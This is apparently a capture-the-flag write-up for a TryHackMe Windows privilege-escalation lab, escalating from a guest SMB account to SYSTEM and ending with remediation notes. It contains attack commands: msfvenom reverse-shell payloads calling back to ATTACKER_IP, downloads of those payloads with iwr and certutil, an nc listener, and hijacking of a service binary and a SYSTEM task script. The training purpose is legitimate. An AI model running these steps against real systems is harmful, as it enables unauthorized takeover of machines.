# Windows Jump

Room: https://tryhackme.com/room/windowsjump

Use privilege escalation knowledge to jump from a guest user to SYSTEM.

A routine vulnerability scan flagged a Windows machine on the internal network; nothing alarming on the surface, just a standard workstation left behind after a round of layoffs. IT never cleaned it up properly. Your job is to find out how badly. Your objective is to escalate from guest access all the way through:  

guest->thmuser->notadmin->svcadmin->SYSTEM

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jr-penetration-tester/jr-penetration-tester/windowsjump.md

## Summary

The host exposed SMB, RDP, WinRM, and several standard Windows RPC-related services. The successful path started with guest SMB access, moved to a leaked default user credential in a public share, then used AutoLogon registry credentials, a writable service binary, and finally a writable batch file executed by a SYSTEM scheduled task.

## Attack Chain

```text
guest SMB access
  -> readable public share
  -> default thmuser credentials
  -> thmuser desktop flag
  -> AutoLogon registry credentials
  -> notadmin
  -> writable service binary
  -> svcadmin shell
  -> writable scheduled-task batch file
  -> SYSTEM shell
  -> final flag
```

## 1. Initial Enumeration

An Nmap scan showed a Windows host with common Windows management and file-sharing services exposed:

```text
135/tcp   msrpc
139/tcp   netbios-ssn
445/tcp   microsoft-ds
3389/tcp  ms-wbt-server
5985/tcp  winrm
```

SMB guest authentication worked with a blank password:

```bash
nxc smb TARGET -u guest -p ''
```

Share enumeration showed a readable public share:

```bash
nxc smb TARGET -u guest -p '' --shares
```

The important result was:

```text
Public    READ
```

## 2. Public SMB Share Disclosure

The public share contained a welcome file:

```bash
smbclient //TARGET/Public -U guest
get welcome.txt
```

The file disclosed default credentials for the first real user.

Sensitive values removed:

```text
Username: thmuser
Password: [REDACTED]
```

This moved the chain from:

```text
guest -> thmuser
```

## 3. Access as thmuser

SMB authentication worked with the leaked account:

```bash
nxc smb TARGET -u thmuser -p '[REDACTED]'
```

WinRM was not available for this user, but RDP access was available.

After logging in as `thmuser`, the first flag was found on the desktop:

```cmd
type C:\Users\thmuser\Desktop\flag1.txt
```

Flag value obfuscated:

```text
THM{5mb_..._5h4r3}
```

The `type` command is the Windows CMD command used to display text file contents.

## 4. thmuser Enumeration

The current user had only low privileges:

```cmd
whoami /priv
whoami /groups
```

No useful privilege such as impersonation was present. The next step was local enumeration using winPEAS.

The tool identified AutoLogon credentials in the Windows Winlogon registry key:

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Manual confirmation command:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

The useful values were:

```text
DefaultUserName: notadmin
DefaultPassword: [REDACTED]
```

This moved the chain from:

```text
thmuser -> notadmin
```

## 5. Access as notadmin

After switching to `notadmin`, the second flag was readable from that user profile:

```cmd
type C:\Users\notadmin\Desktop\flag2.txt
```

Flag value obfuscated:

```text
THM{w1nl0g0n_..._3xp0s3d}
```

Privilege checks again showed a low-privileged token:

```cmd
whoami /priv
whoami /groups
```

The next goal was to find a path from `notadmin` to `svcadmin`.

## 6. Service Enumeration

Service enumeration found a custom service:

```cmd
wmic service get name,displayname,pathname,startname | findstr /i "svcadmin share script cmd ps1 bat"
```

Important result:

```text
THM Background Service    THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

The service ran as `svcadmin`.

Service configuration confirmed the binary path and account:

```cmd
sc.exe qc THMSvc
sc.exe query THMSvc
```

## 7. Writable Service Binary

Permissions on the service directory and binary were checked:

```cmd
icacls C:\Windows\THMSVC
icacls C:\Windows\THMSVC\svc.exe
```

The key issue was that `notadmin` had full control over the service directory, and the service executable itself was writable.

Example finding:

```text
C:\Windows\THMSVC              PRIVESC\notadmin:(F)
C:\Windows\THMSVC\svc.exe     Everyone:(F)
```

The original service executable was backed up:

```cmd
copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
```

A reverse shell payload was generated on the attack box:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o svc.exe
```

The payload was served from the attack box:

```bash
python3 -m http.server PORT
```

The payload was downloaded to replace the service binary:

```powershell
iwr http://ATTACKER_IP:PORT/svc.exe -OutFile C:\Windows\THMSVC\svc.exe
```

The service was started:

```cmd
sc.exe start THMSvc
```

Although the service returned a timeout error, the payload executed and provided a shell as `svcadmin`:

```cmd
whoami
```

Expected result:

```text
privesc\svcadmin
```

This moved the chain from:

```text
notadmin -> svcadmin
```

The third flag was then read:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

Flag value obfuscated:

```text
THM{s3rv1c3_..._h1j4ck3d}
```

## 8. svcadmin Enumeration

The `svcadmin` shell was still low privilege:

```cmd
whoami /priv
whoami /groups
```

There was no useful token privilege for a Potato-style attack.

winPEAS and manual checks showed a writable legacy task folder:

```cmd
icacls C:\Windows\Tasks
icacls C:\Windows\System32\Tasks
```

The key finding was:

```text
C:\Windows\Tasks    PRIVESC\svcadmin:(M)
```

A test confirmed `svcadmin` could write to `C:\Windows\Tasks`:

```cmd
echo test > C:\Windows\Tasks\test.txt
type C:\Windows\Tasks\test.txt
```

## 9. Writable Scheduled Task Script

The legacy task folder contained a cleanup script:

```cmd
dir C:\Windows\Tasks /a /q
```

Interesting file:

```text
C:\Windows\Tasks\cleanup.bat
```

The script contents were:

```cmd
type C:\Windows\Tasks\cleanup.bat
```

Original content:

```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

Permissions showed `svcadmin` could modify it:

```cmd
icacls C:\Windows\Tasks\cleanup.bat
```

Key result:

```text
PRIVESC\svcadmin:(M)
```

A harmless proof confirmed the script executed as SYSTEM:

```cmd
echo whoami ^> C:\temp\cleanup-whoami.txt > C:\Windows\Tasks\cleanup.bat
```

After waiting for the scheduled task to run automatically:

```cmd
type C:\temp\cleanup-whoami.txt
```

Result:

```text
nt authority\system
```

This confirmed:

```text
svcadmin -> SYSTEM
```

## 10. SYSTEM Reverse Shell

A SYSTEM payload was generated:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o sys.exe
```

A listener was started:

```bash
nc -lvnp PORT
```

The payload was served:

```bash
python3 -m http.server PORT
```

The target downloaded the payload:

```cmd
certutil -urlcache -f http://ATTACKER_IP:PORT/sys.exe C:\temp\sys.exe
```

The cleanup script was replaced with a command to run the payload:

```cmd
echo C:\temp\sys.exe > C:\Windows\Tasks\cleanup.bat
```

Because the cleanup task ran automatically, a SYSTEM shell connected back:

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

The final flag was then readable:

```cmd
type C:\flag4.txt
```

Flag value obfuscated:

```text
THM{t4sk_..._SYST3M}
```

## 11. Print All Flags

From the SYSTEM shell, all flags were printed with:

```cmd
for %f in (C:\Users\thmuser\Desktop\flag1.txt C:\Users\notadmin\Desktop\flag2.txt C:\Users\svcadmin\Desktop\flag3.txt C:\flag4.txt) do @echo ----- %f ----- & type "%f"
```

Obfuscated output:

```text
flag1: THM{5mb_..._5h4r3}
flag2: THM{w1nl0g0n_..._3xp0s3d}
flag3: THM{s3rv1c3_..._h1j4ck3d}
flag4: THM{t4sk_..._SYST3M}
```

## Root Cause Summary

### Finding 1: Public share exposed credentials

The public SMB share contained onboarding information with default credentials.

Impact:

```text
guest -> thmuser
```

### Finding 2: AutoLogon credentials stored in registry

The Winlogon registry key contained credentials for `notadmin`.

Impact:

```text
thmuser -> notadmin
```

### Finding 3: Writable service binary

`notadmin` could modify the service executable used by `THMSvc`, which ran as `svcadmin`.

Impact:

```text
notadmin -> svcadmin
```

### Finding 4: Writable scheduled-task script

`svcadmin` could modify `C:\Windows\Tasks\cleanup.bat`, which was executed automatically by a scheduled task as SYSTEM.

Impact:

```text
svcadmin -> SYSTEM
```

## Remediation Notes

Remove sensitive data from public shares and disable guest access where possible.

Remove AutoLogon credentials from the Winlogon registry unless there is a strong operational requirement. Use managed service accounts or proper credential management instead.

Harden service binary and directory ACLs. Standard users should not have write or modify access to service executable paths.

Audit scheduled tasks and any scripts they execute. If a task runs as SYSTEM, every file it runs must be writable only by trusted administrators and SYSTEM.

Regularly review ACLs with tools such as `icacls`, and validate scheduled task configuration with `schtasks`.

## References

- Microsoft `type` command documentation: displays text file contents.
- Microsoft `icacls` documentation: displays or modifies discretionary access control lists.
- Microsoft `schtasks` documentation: scheduled tasks can be queried, created, run, and managed from the command line.
